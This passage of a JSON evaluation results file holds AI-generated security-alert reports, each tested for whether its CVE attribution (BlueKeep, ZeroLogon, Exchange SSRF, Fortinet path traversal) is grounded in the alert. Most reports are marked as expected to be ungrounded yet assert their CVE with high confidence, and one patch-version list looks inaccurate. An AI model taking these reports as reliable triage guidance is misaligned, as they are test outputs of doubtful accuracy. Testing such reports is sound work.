+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-046\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An Exchange server accepted an inbound request containing a forged Cookie header that bypassed authentication and allowed access to internal endpoints. This behavior matches a known server\u2011side request forgery vulnerability discovered in 2021.\",\"threat_type\":\"Server\u2011Side Request Forgery (SSRF) / Authentication Bypass\",\"recommended_action\":\"Immediately block traffic from 203.0.113.216, isolate the affected Exchange server, apply the official patch for CVE\u20112021\u201126855, and audit logs for additional anomalous requests. Update firewall rules to prevent forged Cookie headers from reaching internal services.\",\"confidence_score\":0.9,\"reasoning\":\"The payload includes a Cookie header with X\u2011AnonResource=true and a backend target, a classic pattern for the CVE\u20112021\u201126855 SSRF flaw in Microsoft Exchange, which allows unauthenticated attackers to send internal HTTP requests. The alert\u2019s severity is set to HIGH, and the source IP is external, indicating a likely exploitation attempt. Hence the assessment and recommended actions are based on that CVE.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-049",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2019-0708",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2019-0708"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-049\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An RDP server processed a crafted virtual channel request during pre-authentication, indicating exploitation of the BlueKeep vulnerability. This allows remote code execution and potential wormable spread.\",\"threat_type\":\"Remote Code Execution (Wormable RDP Vulnerability)\",\"recommended_action\":\"Immediately block source IP 203.0.113.219, patch all affected RDP servers to CVE-2019-0708, enable network-level authentication, and monitor for further anomalous RDP activity.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet and event type match the BlueKeep (CVE-2019-0708) vulnerability, which is a wormable RDP remote code execution flaw discovered in 2019. The alert severity is high due to the potential for widespread infection.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-050",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2019-0708",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2019-0708"
+      ],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-050\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"A crafted RDP virtual channel request was detected during pre-authentication on port 3389, indicating an attempt to exploit the BlueKeep vulnerability. The traffic pattern matches the known exploitation technique for the wormable RCE in Remote Desktop Services.\",\"threat_type\":\"Remote Desktop Services Vulnerability Exploitation (BlueKeep)\",\"recommended_action\":\"Immediately isolate the affected host, apply the latest patch for CVE-2019-0708, block inbound RDP traffic from untrusted networks, and conduct a full forensic scan for persistence mechanisms.\",\"confidence_score\":0.95,\"reasoning\":\"The event type is labeled BLUEKEEP and the payload snippet references an MS_T120 channel bound outside its normal allocation during the RDP handshake, which is characteristic of the BlueKeep exploitation (CVE-2019-0708). The presence of this behavior during pre-authentication and the high severity rating confirm that the alert is targeting the wormable RCE in Remote Desktop Services.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-053",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2020-1472",
+      "deterministic_flagged_ungrounded": true,
+      "ungrounded_cves": [
+        "CVE-2020-1472"
+      ],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-053\",\n    \"severity_assessment\": \"HIGH\",\n    \"threat_summary\": \"A Netlogon authentication request with an all\u2011zero client challenge was detected on the domain controller, indicating an exploitation attempt of the ZeroLogon vulnerability. This allows an attacker to impersonate any domain account, potentially escalating privileges to Domain Admin.\",\n    \"threat_type\": \"Privilege Escalation\",\n    \"recommended_action\": \"Immediately isolate the affected domain controller, apply the official patch for CVE-2020-1472, enforce password complexity and change all domain admin passwords, and conduct a full audit for lateral movement or compromised accounts.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The event matches the known ZeroLogon exploitation pattern (all\u2011zero client challenge), which is documented as CVE-2020-1472. The severity level is consistent with the alert\u2019s HIGH designation, and the recommended actions follow standard mitigation steps for this vulnerability.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-054",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2020-1472",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-054\",\"severity_assessment\":\"CRITICAL\",\"threat_summary\":\"The alert indicates a ZeroLogon authentication attempt where a domain controller received an all\u2011zero client challenge, a classic sign of the 2020 privilege escalation vulnerability. This could allow an attacker to impersonate any account and gain domain admin privileges.\",\"threat_type\":\"Privilege Escalation\",\"recommended_action\":\"Immediately block the source IP (203.0.113.224), review domain controller logs for additional suspicious authentication attempts, and ensure all domain controllers are patched to CVE\u20112020\u20111472. Consider isolating the affected systems and conducting a full security audit.\",\"confidence_score\":0.95,\"reasoning\":\"The payload snippet shows an all\u2011zero challenge typical of the ZeroLogon vulnerability, which is documented as CVE\u20112020\u20111472. The alert severity is marked CRITICAL, indicating a high risk of domain admin takeover if exploited. The recommended actions align with standard mitigation steps for this vulnerability.\"}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-057",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2018-13379",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\n    \"alert_id\": \"SELFCHECK-PROMPTED-057\",\n    \"severity_assessment\": \"CRITICAL\",\n    \"threat_summary\": \"An SSL VPN portal on the Fortinet device received a crafted URL containing multiple directory traversal sequences designed to access the session file store. This pattern matches the known 2018 credential\u2011harvesting vulnerability, indicating an attempt to read or exfiltrate VPN session data.\",\n    \"threat_type\": \"Vulnerability Exploitation \u2013 Path Traversal\",\n    \"recommended_action\": \"Immediately block the source IP 203.0.113.227, apply the latest FortiOS firmware patch that addresses CVE\u20112018\u201113379, and review logs for similar traversal attempts. Enable strict URL filtering on the SSL VPN and monitor for any anomalous session file access.\",\n    \"confidence_score\": 0.95,\n    \"reasoning\": \"The payload includes a classic directory traversal payload targeting the SSL VPN session store, a pattern documented in CVE\u20112018\u201113379. The alert type and description align with that CVE, confirming a credential\u2011harvesting exploit attempt. This high\u2011confidence assessment is based on the matching URL pattern and known FortiOS vulnerability data.\"\n}"
+    },
+    {
+      "alert_id": "SELFCHECK-PROMPTED-058",
+      "class": "prompted",
+      "expected_ungrounded": true,
+      "ground_truth_cve": "CVE-2018-13379",
+      "deterministic_flagged_ungrounded": false,
+      "ungrounded_cves": [],
+      "raw_report_text": "{\"alert_id\":\"SELFCHECK-PROMPTED-058\",\"severity_assessment\":\"HIGH\",\"threat_summary\":\"An SSL VPN portal processed a crafted URL attempting directory traversal to access session files, indicating an exploitation of a known credential\u2011harvesting vulnerability. The attacker targeted the session file store via a path traversal attack.\",\"threat_type\":\"Vulnerability Exploitation \u2013 Path Traversal\",\"recommended_action\":\"Immediately block source IP 203.0.113.228, apply the latest FortiOS firmware (\u22656.2.1, 6.4.1, 6.6.1, or 7.0.1) to patch CVE\u20112018\u201113379, and monitor for additional malicious attempts.\",\"confidence_score\":0.92,\"reasoning\":\"The payload contains a classic path traversal sequence targeting the SSL VPN session file store, matching the description of Fortinet\u2019s CVE\u20112018\u201113379 vulnerability. The alert severity is HIGH, and the recommended actions align with Fortinet\u2019s official mitigation steps for this vulnerability.\"}"
+    }
+  ]
+}
